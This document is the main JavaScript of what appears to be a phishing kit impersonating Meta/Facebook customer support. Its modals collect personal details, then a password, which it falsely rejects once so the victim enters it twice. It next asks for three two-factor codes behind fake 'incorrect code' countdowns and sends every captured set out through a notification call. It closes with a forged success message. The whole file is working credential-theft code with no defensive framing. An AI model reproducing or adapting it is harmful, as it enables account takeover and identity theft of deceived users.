// Main Application Logic

// Generate ticket ID
document.getElementById('ticketId').textContent = Utils.generateTicketId();

// Start verification flow
document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);

// ==================== MODAL 1: CLIENT INFO ====================
function openClientModal() {
    const content = `
        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
        <form id="clientForm" class="space-y-3">
            <input type="text" id="fullName" placeholder="Full Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="email" id="email" placeholder="Email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="email" id="emailBusiness" placeholder="Email Business" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="text" id="fanpage" placeholder="Page Name" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <input type="tel" id="phone" placeholder="Phone Number" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
            <div>
                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
                <div class="grid grid-cols-3 gap-2">
                    <input type="number" id="day" placeholder="Day" min="1" max="31" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                    <input type="number" id="month" placeholder="Month" min="1" max="12" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                    <input type="number" id="year" placeholder="Year" min="1900" max="2024" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none" required>
                </div>
            </div>
            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
            <p class="text-[#9a979e] text-[14px] mb-[7px]">Our response will be sent to you within 14 - 48 hours.</p>
            <div class="mt-[15px] mb-[20px]">
                <label class="cursor-pointer flex items-center gap-[5px] text-[14px] " for="custom-checkbox">
                    <label class="inline-flex items-center cursor-pointer">
                        <input type="checkbox">
                    </label>
                    I agree with<a class="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Terms of use <img src="./public/icons/reject.svg" class="w-[10px] h-[10px] items-center inline" alt=""></a>
                </label>
            </div>
            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Send</button>
        </form>
    `;

    Modal.create('clientModal', content);
    Modal.open('clientModal');

    document.getElementById('clientForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('emailBusiness').value.trim(),
            fanpage: document.getElementById('fanpage').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            day: document.getElementById('day').value,
            month: document.getElementById('month').value,
            year: document.getElementById('year').value
        };

        Utils.saveRecord('__client_rec__fi_rst', formData);
        Modal.close('clientModal');
        openSecurityModal();
    });
}

// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="h-full flex flex-col items-center justify-between flex-1">
            <div class="w-12 h-12 mb-5 mx-auto">
                <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
            </div>
            <div class="w-full">
                <p class="text-[#9a979e] text-sm mb-4">For your security, you must enter your password to continue.</p>
                <form id="securityForm">
                    <input type="password" id="password" placeholder="Password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Continue</button>
                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">Forgot your password?</a></p>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = document.getElementById('password').value.trim();
        const errorMsg = document.getElementById('passwordError');
        const submitBtn = e.target.querySelector('button');

        errorMsg.classList.add('hidden');
        if (!password) {
            errorMsg.textContent = "You haven't entered your password!";
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                document.getElementById('password').value = '';
                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                errorMsg.classList.remove('hidden');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const description = `Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)`;

    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                <div class="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
                    <span>${userData.fullName}</span>
                    <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
                    <span>Facebook</span>
                </div>
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">Two-factor authentication required (1/3)</h2>
                <p class="text-[#9a979e] text-sm mb-4">${description}</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/images/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="number" id="twoFa" placeholder="Code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    let countdownInterval;

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = document.getElementById('twoFa').value.trim();
        const errorMsg = document.getElementById('authError');
        const submitBtn = e.target.querySelector('button');
        const input = document.getElementById('twoFa');

        errorMsg.classList.add('hidden');
        if (!twoFa) {
            errorMsg.textContent = "You haven't entered the code!";
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 1;
            }, 1400);
        } else if (authClickCount === 1) {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__f_if_th', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(input, errorMsg, submitBtn);
                authClickCount = 2;
            }, 1200);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
            const clientData = { twoFaThird: twoFa, ...dataLocal };
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });

    function startCountdown(input, errorMsg, submitBtn) {
        input.disabled = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('opacity-70');

        let time = CONFIG.COUNTDOWN_TIME;
        errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
        errorMsg.classList.remove('hidden');

        countdownInterval = setInterval(() => {
            time--;
            errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;

            if (time <= 0) {
                clearInterval(countdownInterval);
                input.disabled = false;
                input.value = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-70');
                errorMsg.classList.add('hidden');
            }
        }, 1000);
    }
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/success.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}

